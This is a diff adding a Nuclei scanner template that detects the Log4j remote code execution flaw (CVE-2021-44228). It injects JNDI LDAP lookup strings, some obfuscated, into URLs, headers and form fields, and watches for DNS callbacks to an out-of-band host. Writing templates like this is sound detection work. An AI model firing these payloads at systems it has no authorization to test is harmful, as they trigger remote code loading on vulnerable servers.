@@ -1,0 +1,84 @@
+id: CVE-2021-44228-ppb
+
+info:
+  name: Remote code injection in Log4j
+  author: melbadry9,dhiyaneshDK,daffainfo,PPBInfoSec
+  severity: critical
+  description: Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.
+  reference:
+    - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
+    - https://www.lunasec.io/docs/blog/log4j-zero-day/
+    - https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
+    - https://gist.github.com/fopinappb/3213ac28a238daa8004cbb3038f7abd8
+  tags: cve,cve2021,rce,oast,log4j
+
+requests:
+  - raw:
+      # use invalid port (99999) so DNS is resolved but LDAP connection instantly fails
+      # otherwise nuclei connection times out and matchers do not run... FIXME?
+      # https://github.com/projectdiscovery/nuclei/issues/1358
+      # also, we do not care for actual LDAP egress, just spotting JNDI lookups: invalid port makes scanning quite faster
+
+      # injections are better tested isolated (ie: User-Agent is logged but only for valid path, such as /)
+      - |
+        GET /${jndi:ldap://surfscan.t1.{{interactsh-url}}:99999/a} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /?x=${jndi:ldap://surfscan.t2.{{interactsh-url}}:99999/a} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: ${jndi:ldap://surfscan.t4.{{interactsh-url}}:99999/a}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Referer: ${jndi:ldap://surfscan.t3.{{interactsh-url}}:99999/a}
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        X-Api-Version: ${jndi:ldap://surfscan.t5.{{interactsh-url}}:99999/a}
+        X-Forwarded-For: ${jndi:ldap://surfscan.t6.{{interactsh-url}}:99999/a}
+        Authentication: ${jndi:ldap://surfscan.t7.{{interactsh-url}}:99999/a}
+        X-Authentication: ${jndi:ldap://surfscan.t8.{{interactsh-url}}:99999/a}
+        X-Application: ${jndi:ldap://surfscan.tA.{{interactsh-url}}:99999/a}
+        X-IP: ${jndi:ldap://surfscan.t9.{{interactsh-url}}:99999/a}
+      # https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-solr-log4j-rce.yaml
+      - |
+        GET /solr/admin/collections?action=$%7Bjndi:ldap://surfscan.tB.{{interactsh-url}}/a%7D HTTP/1.1
+        Host: {{Hostname}}
+      # https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/apache/apache-ofbiz-log4j-rce.yaml
+      - |
+        GET /webtools/control/main HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: OFBiz.Visitor=${jndi:ldap://surfscan.tC.{{interactsh-url}}}
+      # https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/mobileiron/mobileiron-log4j-jndi-rce.yaml
+      - |
+        POST /mifs/j_spring_security_check HTTP/1.1
+        Referer: {{RootURL}}/mifs/user/login.jsp
+        Content-Type: application/x-www-form-urlencoded
+
+        j_username=${j${k8s:k5:-ND}i${sd:k5:-:}${lower:l}d${lower:a}${lower:p}://surfscan.tD.{{interactsh-url}}}&j_password=password&logincontext=employee
+      # https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/vmware/vmware-vcenter-log4j-jndi-rce.yaml
+      - |
+        GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://surfscan.tE.{{interactsh-url}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+      - type: regex
+        part: interactsh_request
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
+
+    extractors:
+      - type: regex
+        part: interactsh_request
+        group: 1
+        regex:
+          - '([a-z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+'
